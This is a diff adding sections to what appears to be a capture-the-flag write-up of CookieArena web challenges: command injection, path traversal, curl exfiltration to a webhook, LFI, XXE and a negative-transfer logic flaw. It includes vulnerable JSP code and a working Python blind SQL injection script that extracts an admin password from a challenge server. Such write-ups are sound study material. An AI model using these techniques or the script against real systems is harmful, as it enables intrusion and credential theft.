@@ -213,4 +213,181 @@ in this `command injection` challenge we have bypassed the ways to chain `comman
 
 ---
 
-## 
+## NSLookup (Level 1)
+
+In this challenge we just use interrupt to `execute` more
+
+![image](./image/cookiearenaweb/67.png)
+
+![image](./image/cookiearenaweb/68.png)
+
+---
+
+## Under Construction
+
+Please `unzip` the war file and read the source code
+
+`image.jsp`
+```jsp
+<%@ page trimDirectiveWhitespaces="true" %>
+<%
+String filepath = getServletContext().getRealPath("resources") + "/";
+String _file = request.getParameter("file");
+
+response.setContentType("image/jpeg");
+try{
+    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath + _file);
+    int i;   
+    while ((i = fileInputStream.read()) != -1) {  
+        out.write(i);
+    }   
+    fileInputStream.close();
+}catch(Exception e){
+    response.sendError(404, "Not Found !" );
+}
+%>
+```
+
+We see that the path `traversal` vulnerability is right on the data passed through `_file` and is not filtered.
+
+![image](./image/cookiearenaweb/69.png)
+
+---
+
+## Ethical Ping Pong Club
+
+A fairly common command injection challenge, we can bypass it by going to a new line and inserting more commands in `burpsuite`
+
+![image](./image/cookiearenaweb/70.png)
+
+but the `filter` won't give us spaces, so we need to `bypass` it
+
+![image](./image/cookiearenaweb/71.png)
+
+![image](./image/cookiearenaweb/72.png)
+
+---
+
+## Baby Crawler
+
+After learning about `curl` command, `curl` can execute system command and send to the server we provide, let's try it
+
+![image](./image/cookiearenaweb/73.png)
+
+![image](./image/cookiearenaweb/74.png)
+
+![image](./image/cookiearenaweb/75.png)
+
+we can see that the file content after `@` is `test.txt` which is sent to the `webhook`. let's take advantage of this challenge, we know that `escapeshellcmd` will `escape` the characters: 
+``` shell
+' " & ; | ` \ $ > < * ? ~ # ( ) [ ] { } \n
+```
+and the `payload` we don't have in it
+
+![image](./image/cookiearenaweb/76.png)
+
+![image](./image/cookiearenaweb/77.png)
+
+---
+
+## File Download
+
+there is a path `traversal` vulnerability in `/real`, exploit it to read the `flag`
+
+![image](./image/cookiearenaweb/78.png)
+
+---
+
+## Upload File Path Traversal
+
+in this challenge we can upload file to `/upload` but can not access because it is `forbidden`, upload it somewhere else, I have backed up before uploading a folder to practice. Note that if the return message is still in uploads then we are not successful, bypass it so that the return is like `upload/../file`
+
+![image](./image/cookiearenaweb/79.png)
+
+![image](./image/cookiearenaweb/80.png)
+
+---
+
+## Be Positive
+
+in this challenge we have the right to `trade`, `transfer` money between `alice` and `bob`, the amount transferred cannot exceed the current amount, `flag` needs `3001` to buy, but each side only has `1500`, if transferred all then it is not enough, at this time I think of transferring negative money to be able to calculate the positive number 
+- from `alice` transfer to `bob` `-5000`, the `system` does not allow but we can overcome by editing in the source code with `devtool`
+
+![image](./image/cookiearenaweb/81.png)
+
+![image](./image/cookiearenaweb/82.png)
+
+After transferring a negative number, the account will be immediately credited with that amount. This is an error about exceeding the value of the data.
+
+![image](./image/cookiearenaweb/83.png)
+
+---
+
+## Upload File via URL
+
+a challenge about `LFI`, we can replace `url` with `local url`, trick server to `download` file and render to interface
+
+![image](./image/cookiearenaweb/84.png)
+
+![image](./image/cookiearenaweb/85.png)
+
+![image](./image/cookiearenaweb/86.png)
+
+---
+
+## Simple Blind SQL Injection
+
+this is a pretty cool challenge about `blind sql injection` technique, try it in input field, if user exists (or query true) it will show user `exists`, otherwise it will return `not found`, taking advantage of this I wrote a script to exploit
+
+```python
+import requests
+import string
+
+URL = "http://103.97.125.56:30212/?uid="
+
+charset = string.ascii_lowercase + string.digits + '_'
+
+def get_len():
+    length = 0
+    for i in range(1, 100):
+        payload = f"admin' and length(upw)={i} --"
+        res = requests.get(URL+payload)
+        
+        if 'exists' in res.text.lower():
+            length = i
+            break
+        print(f"Trying length: {i}")
+    return length
+
+def get_password_length(length):
+    pw = ""
+    for i in range(1, length + 1):
+        for c in charset:
+            payload = f"admin' and substr(upw,{i}, 1)='{c}' --"
+            res = requests.get(URL + payload)
+            if 'exists' in res.text.lower():
+                pw += c
+                break
+        print(f"Current password: {pw}")
+    return pw
+
+len_password = get_len()
+if len_password:
+    print(f"Password length found: {len_password}")
+    password = get_password_length(len_password)
+    print(f"Password found: {password}")
+```
+
+![image](./image/cookiearenaweb/87.png)
+
+![image](./image/cookiearenaweb/88.png)
+
+---
+
+## XXE Injection 001
+
+In the `xxe` injection challenge, we see that the system will recognize the entities in the main class as `employees`, the child entities in the employee tags, based on this we also `inject` an additional `entity` to get data in the system and pass it to any data in the returned json format.
+
+![image](./image/cookiearenaweb/89.png)
+
+---
